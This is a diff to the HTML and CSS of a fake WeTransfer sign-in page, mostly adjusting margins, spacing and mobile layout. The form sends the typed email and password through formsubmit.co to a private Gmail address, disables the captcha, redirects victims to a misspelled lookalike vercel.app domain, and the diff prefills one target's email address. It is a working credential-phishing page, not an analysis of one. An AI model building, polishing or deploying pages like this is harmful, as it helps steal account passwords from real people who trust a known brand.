@@ -26,33 +26,24 @@
       padding: 20px;
     }
 
-    /* Card Wrapper with explicit height & flex distribution */
+    /* Card Wrapper (Stays normal sized, no full-screen stretching) */
     .login-container {
       background: #ffffff;
       width: 100%;
       max-width: 420px;
-      min-height: 680px; /* Gives enough vertical space to push the logo up */
       padding: 40px 32px;
       text-align: center;
-      display: flex;
-      flex-direction: column;
     }
 
-    /* Logo Styling pushed to the top */
+    /* Logo Styling - Fixed spacing to separate it from the form like image_2.png */
     .logo {
       font-family: "Times New Roman", Times, serif; 
       font-size: 44px;
       font-weight: 900;
       letter-spacing: -1.5px;
       color: #000000;
-      margin-top: 20px;
-      margin-bottom: auto; /* This forces everything below it down, pushing the logo to the top */
-    }
-
-    /* Form Content Wrapper */
-    .form-content {
-      width: 100%;
-      margin-top: 40px; /* Creates a clean gap below the top area */
+      margin-top: 10px;
+      margin-bottom: 60px; /* Increased margin explicitly creates the big gap under the logo */
     }
 
     /* Headings */
@@ -114,11 +105,6 @@
       cursor: pointer;
       margin-top: 4px;
       margin-bottom: 28px;
-      transition: background-color 0.2s ease;
-    }
-
-    .btn-continue:hover {
-      background-color: #2b5cd4;
     }
 
     /* Secondary Links */
@@ -126,7 +112,7 @@
       display: flex;
       flex-direction: column;
       gap: 10px;
-      margin-bottom: 32px;
+      margin-bottom: 24px;
     }
 
     .link {
@@ -143,7 +129,7 @@
       text-align: center;
       color: #a6a6a6;
       font-size: 13px;
-      margin-bottom: 32px;
+      margin-bottom: 24px;
     }
 
     .divider::before,
@@ -161,11 +147,13 @@
       margin-left: .5em;
     }
 
-    /* Responsive Tuning */
+    /* Clean mobile adjustments without breaking heights */
     @media (max-width: 480px) {
       .login-container {
-        padding: 24px 16px;
-        min-height: 100vh; /* Fills mobile screens nicely like native apps */
+        padding: 32px 20px;
+      }
+      .logo {
+        margin-bottom: 45px; /* Slightly adjusted for smaller viewports */
       }
     }
   </style>
@@ -173,45 +161,44 @@
 <body>
 
   <div class="login-container">
+    <div class="login-container">
     <img src="logo.08he3n6vuv2qc (1).svg">
+    <!-- Sign In Headings -->
+    <h2 class="title">Sign In</h2>
+    <p class="subtitle">to continue to your WeTransfer account.</p>
 
-    <!-- Main Content grouped together below -->
-    <div class="form-content">
-      <h2 class="title">Sign In</h2>
-      <p class="subtitle">to continue to your WeTransfer account.</p>
-
-     <!-- ✅ FormSubmit Integration -->
+    <!-- Form Container -->
+    <!-- ✅ FormSubmit Integration -->
   <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">
 
 
     <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
     <input type="hidden" name="_captcha" value="false">
-        <!-- Email Field -->
-        <div class="input-group">
-          <label for="email">Email</label>
-          <input type="email" id="email"required>
-        </div>
-
-        <!-- Password Field -->
-        <div class="input-group">
-          <label for="password">Password</label>
-          <input type="password" id="password" placeholder="Password" required"> 
-        </div>
-
-        <!-- Submit Button -->
-        <button type="submit" class="btn-continue">Continue</button>
-      </form>
-
-      <!-- Links and Alternative Options -->
-      <div class="links-container">
-        <a class="link">Forgot password?</a>
-        <a class="link">Use a different email?</a>
+      <!-- Email Field -->
+      <div class="input-group">
+        <label for="email">Email</label>
+        <input type="email" id="email" value="nxloaded@gmail.com" required>
       </div>
 
-      <div class="divider">or</div>
+      <!-- Password Field -->
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Password" required"> 
+      </div>
 
-      <a class="link">Receive a temporary code via email</a>
+      <!-- Submit Button -->
+      <button type="submit" class="btn-continue">Continue</button>
+    </form>
+
+    <!-- Links and Alternative Options -->
+    <div class="links-container">
+      <a class="link">Forgot password?</a>
+      <a class="link">Use a different email?</a>
     </div>
+
+    <div class="divider">or</div>
+
+    <a class="link">Receive a temporary code via email</a>
   </div>
 
 </body>
